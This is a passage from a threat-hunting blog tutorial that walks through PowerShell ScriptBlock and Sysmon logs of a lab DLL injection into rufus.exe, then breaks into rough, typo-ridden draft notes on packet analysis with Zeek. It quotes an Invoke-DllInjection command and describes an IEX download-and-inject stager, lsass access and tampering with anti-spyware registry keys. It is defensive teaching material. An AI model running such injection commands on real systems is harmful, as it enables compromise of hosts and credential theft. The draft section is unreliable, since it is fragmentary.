<p>First, we can see that all the entries are assigned the lowest warning level (<code>Verbose</code>) with a single expection that is categorized as <code>Warning</code>. Let&rsquo;s make a note to scrutinise this when we get to that entry.</p>
<p>The next obvious thing we can see is that every single event ID is the exact same - <code>4104</code>. This may seem strange but is actually expected - PowerShell ScriptBlock logging is indeed associated with Event <code>ID 4104</code>.</p>
<p>And then one final observation: look at the date and time stamps. Do you notice anything peculiar?</p>
<figure class="custom-figure-3"><img src="/img/twins.gif"/>
</figure>

<p>It seems that almost all the entries come in pairs - that is each timestamp occurs in multiples of two&rsquo;s. Let&rsquo;s be sure to also see what&rsquo;s happening there.</p>
<p>Ok great so now that we&rsquo;ve spotted some interesting patterns let&rsquo;s just go ahead and jump right in. Note that as was the case with Sysmon, the first two entries are artifacts created when we cleared the log. We can once again skip these.</p>
<p>In the third entry then we can immediately see the log related to our PowerShell command that went to download the injection script from the web server and loaded it into memory.</p>
<figure class="custom-figure"><img src="/img/image090.png"/>
</figure>

<p>This is worth taking note of since in a &ldquo;real-world&rdquo; attack scenario we would expect something similar to run from the stager.</p>
<p>Right after this we have the only entry with an assigned level of <code>Warning</code> (the highest in our set), so let&rsquo;s see what the deal is.</p>
<figure class="custom-figure"><img src="/img/image091.png"/>
</figure>

<p>Note the entire log entry is too large to reproduce here in its entirety, but it should immediately become clear what we&rsquo;re looking at here - the actual contents of the script we just downloaded and injected into memory!</p>
<p>So when we ran the preceding IEX command, it downloaded the script from the provided FQDN and injected it directly into memory. Since PowerShell ScriptBlock logging is enabled, the content of the downloaded script itself is logged as a separate entry.</p>
<p>This is awesome for us since, again, if this was an actual attack it means we&rsquo;d not only have a log telling us a script was downloaded + injected, but indeed it would relay the very content of the script itself!</p>
<p>Immediately after this we can see another log entry with the same time stamp that simply says <code>prompt</code>.</p>
<figure class="custom-figure"><img src="/img/image092.png"/>
</figure>

<p>Remember when we looked at everything at the start and we noticed how all the entries come in pairs? Well, this is what we are looking at here - the second half of the pair. I won&rsquo;t repeat this for the remainder of this analysis, but you&rsquo;ll notice if you go through it by yourself that every single PowerShell ScriptBlock log entry will be followed by another like this that simply says <code>prompt</code>.</p>
<p>So what&rsquo;s going on here? Well, whenever you interact with PowerShell, it actually performs a magical sleight-of-hand. Think of when you yourself have a PowerShell terminal open - you see the prompt, you run a command, it executes, and then afterwards once again you see the prompt so you can enter a subsequent command.</p>
<figure class="custom-figure"><img src="/img/moment.gif"/>
</figure>

<p>So it seems to us as the observer that once the command we ran is completed PowerShell just magically drops back into the prompt, as if it is the default state to which it just returns to automatically each time. But this is actually not so. When we run a command PowerShell executes it and then, unbeknownst to us, it runs another function in the background called <code>prompt</code>. It&rsquo;s that what creates the <code>PS C:\&gt;</code> that you see before entering any command.</p>
<p>So this is perfectly normal and expect to always see it - for every PowerShell command that runs, it will be followed by a <code>prompt</code> log, which is simply PowerShell creating a new prompt for us.</p>
<p>So moving on to the rest of the log entries we&rsquo;ll notice some other commands we ran. First there is the <code>ps</code> command we used to get the process ID for <code>rufus.exe</code>. However, since as I mentioned before this is not expected to occur in an actual attack, we can ignore it.</p>
<p>We then see the log entry for the command that injected the malicious DLL into <code>rufus.exe</code>, again something we would expect to see in an actual attack.</p>
<figure class="custom-figure"><img src="/img/image093.png"/>
</figure>

<p>This is then followed by two other entries with the exact same timestamp, containing commands we did not explicitly run. However, as the timestamp is the exact same, we can assume they resulted from the command we ran (<code>Invoke-DllInjection -ProcessID 3468 -Dll C:\Users\User\Desktop\evil.dll</code>).</p>
<figure class="custom-figure"><img src="/img/image094.png"/>
</figure>

<p>So what might be happening here? There entries are likely related to the process of interacting with or analyzing assemblies, possibly as part of the DLL injection procedure. My best guess is that the script blocks might be inspecting certain properties of assemblies to determine whether they meet specific criteria. As was the case before, this is not really a rabbit hole that we are equipped to go down at this point, so let&rsquo;s move ahead.</p>
<p>And that actually concludes our logging analysis. Let&rsquo;s take our time to unpack everything we&rsquo;ve learned here in <code>Final Thoughts</code></p>
<hr>
<p> </p>
<h1 id="65-final-thoughts">6.5. Final Thoughts</h1>
<p>Up until this section we had gathered <em>a lot</em> of evidence confirming something suspicious was going on, however we did not really know many specifics of the attack.</p>
<p>We essentually only had three critical pieces of info - the name of the suspicious process (<code>rundll32.exe</code>), the name of the parent process that spawned it (<code>rufus.exe</code>), and the ip address it connected to (ie potentially the ip of the attacker, C2 server). But in this section we saw the great depth of information we can learn from analysing Sysmon and PowerShell ScriptBlock logs.</p>
<figure class="custom-figure"><img src="/img/learn.gif"/>
</figure>

<p><strong>Using Sysmon we learned:</strong></p>
<ul>
<li>The URL, IP, and hostname of the web server the stager reached out to download the injection script.</li>
<li>The malware manipulated the <code>DisableAntiSpyware</code> registry keys.</li>
<li>The malware accessed <code>lsass.exe</code>, indicating some credentials were potentially compromised.</li>
<li>The malware launched <code>raserver.exe</code> with the <code>/offerraupdate</code> flag, creating another potential backdoor.</li>
</ul>
<p><strong>Using PowerShell ScriptBlock we learned:</strong></p>
<ul>
<li>The actual command that was used by the &ldquo;stager&rdquo; to donwload the script from the web server and inject it into memory.</li>
<li>Crucially, we learned the actual contents of the dll-injection script.</li>
<li>Which command was actually used to inject the script into <code>rufus.exe</code>, from here we will also learn the id/location of the malicious dll</li>
</ul>
<figure class="custom-figure"><img src="/img/pinkfloyd.gif"/>
</figure>

<p>Additionally, the logs provided us with exact timestamps for many major events, which can be very useful in the incident response process.</p>
<p>So I think it&rsquo;s clear just how useful log analysis can be in a threat hunt. Once we&rsquo;ve narrowed down our target via memory analysis we can learn much more about the event and mechanisms involved in the actual compromise by jumping into select logs.</p>
<p>This leaves us with one final domain in which to investigate our target - the realm of packets.</p>
<hr>
<hr>
<p> </p>
<h1 id="7-post-mortem-forensics-traffic-analysis">7. Post-Mortem Forensics: Traffic Analysis</h1>
<h1 id="71-introduction">7.1. Introduction</h1>
<p>Hunting in the realm of traffic can be extremely challenging given the scale, hwoever it&rsquo;s also the one domain where, however difficult, the answer is always sure to be found.</p>
<p>Why? Well as once again Chris Benson likes to say: it&rsquo;s the one place malware cannot hide. Malware can find incredivbly sophistiaceted ways to obscure its presence in memory, it can find creative ways to avoid/delete logging, but it has to generate packets. And if it does not generate packets, it means it is not communicating.</p>
<p>is in some respect</p>
<p>&hellip; truth -</p>
<p>As Chris Benson like</p>
<p>talk about why abbrevuiated</p>
<h1 id="traffic-analysis">TRAFFIC ANALYSIS</h1>
<h1 id="introduction">Introduction</h1>
<p>traffic analyssius one of most powerful ways to do threat hunting
but like every tool has strenghts and weaknesses</p>
<p>our specific investaition here, analyzing ane vent that was basicalkly only the initiiaal foothold, its weakness.</p>
<p>For Traffic Analysis cIntroductyion
LIMITATION of traffic in this scenarion</p>
<ul>
<li>mention here that it&rsquo;s strength not really as much as others in deteceting intiail actions. Traffic is not great for finding individual actions, it&rsquo;s great for finding emergent patterns (time, session size etc), usually the longer period the better.</li>
</ul>
<p>Here we only simulated an initial comprmoise, we did not really maintain a long perdio (1 day +) etc, communciating with server, sharing data etc. So</p>
<ul>
<li>
<p>first do the Threat Hunting Level 1 course</p>
</li>
<li>
<p>then do the Chris Benton traffic analysis</p>
</li>
<li>
<p>Let&rsquo;s first rerun attack (remember to drop cmd etc)</p>
</li>
<li>
<p>redo pcap with just that</p>
</li>
<li>
<p>then let&rsquo;s do threat hunting level 1, other vid courses teaching about c2 in traffic logs etc.</p>
</li>
</ul>
<h1 id="for-now-redo-pcap-so-cleaner">FOR NOW REDO PCAP SO CLEANER</h1>
<p>Ok our bew pcap has 584
first things of  interest seem to be 58 +59 - DNS query for the web server
we can look into second one and we can see that the ip for the URL was 185.199.108.133</p>
<p>then we see a whole series of convos between our IP and that IP, making connection, checking certs (TLS) etc</p>
<p>then 116 we can see ARP asking for IP of attacker, clearly now scipt has been injected and malware seeking to make conneciton back</p>
<p>117 we can see response</p>
<p>then from 118 on we can see long convo between the two - victim and attacker</p>
<p>let&rsquo;s follow convo see what&rsquo;s intersrting</p>
<ul>
<li>immediately what do we see? PE header - magic bytes + DOS stub</li>
<li>then about 1/3 of way in we see what looks like a series of runtime errors</li>
</ul>
<p><a href="https://www.first.org/resources/papers/conference2010/cummings-slides.pdf">https://www.first.org/resources/papers/conference2010/cummings-slides.pdf</a></p>
<p>we see some strings, google it above
can we save it and search it with YARA rule??</p>
<p>no, no positive hits with YARA</p>
<p>for now, let&rsquo;s abandon this since sidetrack</p>
<p>we can see it in course, find interesting, but say outside of scopt</p>
<p>we create a new folder, this is where output will go
we navigate to folder
we run the command
[full path to zeek] -r [full path to pcap]</p>
<p>analyst@analyst:~/Desktop/zeeklogs$ /opt/zeek/bin/zeek -r ~/Desktop/new_capture.pcapng</p>
<p>when we do this it generates 6 logs</p>
<p>+++++++++++++++++++++++++++++++++++</p>
<p>First, build a case mode UII</p>
<p>Second, Pareto Principle logging.</p>
<ul>
<li>
<p>mention this one usualyl more realm of SOC/SIEM and not Forensics, which usually more focus of threat hutning.</p>
</li>
<li>
<p>Likely one of the thoughts underpinning this attitude is that logs are grunt-work, mountains of nothing that needs to be sifted through, mountains so huge its completly beyond the scope of humams, and so SIEMs not only CAN do it, but are better than humans in it.</p>
</li>
<li>
<p>but that is true for the general appraco to logs. But what we are speaking of here is a much specific way of looking at logs - limitiing the type of logs we look at. Additioarnlly, logs depending on the PHASE. See below - logs might not be a great place to start in Phase 1, but for example can be perfect for Phase 2. Sicne you already more or less know what you are looking for, makes the volume manageable, esp considering we&rsquo;re likely only interested in Sysmon, Powershell, and a highly select WEL IDs.</p>
</li>
</ul>
<p>ULTIMATELY, Phase 1 should focus on where they cannot hide - meaning memory and packets. Every where else, disk, logs, etc they can hide. but they can never hide from memory/packets = memory when they are at rest/use, packets when they are in transit.</p>
<p>Ok so now as we go ahead, remember we have no idea of the attack, we don&rsquo;t know a DLL injected attack has happened, since that was &ldquo;evil ash&rdquo; doing it. Meaning we are in Phase 1, and then thios I might not mention but for own sanity - at end of live analysis II (PE Hacker), we can then switch over to Phase II.</p>
<p>Will be using same VM here, victim, in practice we would bnever do this,.</p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/threat_hunting">threat_hunting</a></li>
					
					<li><a href="/tags/c2">C2</a></li>
					
					<li><a href="/tags/dll_injection_attacks">dll_injection_attacks</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/faanross" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/faanross" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a><a class="soc" href="https://www.youtube.com/channel/UCtwchzdOYHiXai5BxXPiHMg" rel="me" title="YouTube"><i data-feather="youtube"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2023  | hack the planet |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>


<script>
  feather.replace()
</script></div>
    </body>
</html>
